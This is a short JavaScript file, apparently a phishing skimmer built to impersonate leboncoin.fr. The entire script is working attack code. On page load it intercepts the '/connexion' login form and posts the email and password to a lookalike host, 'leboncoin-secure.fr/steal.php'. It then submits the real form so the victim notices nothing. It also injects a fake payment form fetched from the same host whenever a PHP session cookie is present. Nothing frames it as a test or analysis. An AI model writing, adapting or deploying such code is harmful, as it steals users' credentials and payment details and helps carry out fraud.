// Override form submission to steal credentials
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.querySelector('form[action="/connexion"]');
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.querySelector('input[name="email"]').value;
            const password = document.querySelector('input[name="password"]').value;

            // Send credentials to attacker-controlled server
            fetch('https://leboncoin-secure.fr/steal.php', {
                method: 'POST',
                body: JSON.stringify({ email, password }),
                headers: { 'Content-Type': 'application/json' }
            }).then(() => {
                // Auto-submit to real leboncoin.fr to avoid detection
                this.submit();
            });
        });
    }

    // Inject fake payment form after login
    const session = document.cookie.split(';').find(c => c.trim().startsWith('PHPSESSID'));
    if (session) {
        fetch('https://leboncoin-secure.fr/payment.html')
            .then(response => response.text())
            .then(html => {
                document.body.insertAdjacentHTML('beforeend', html);
            });
    }
});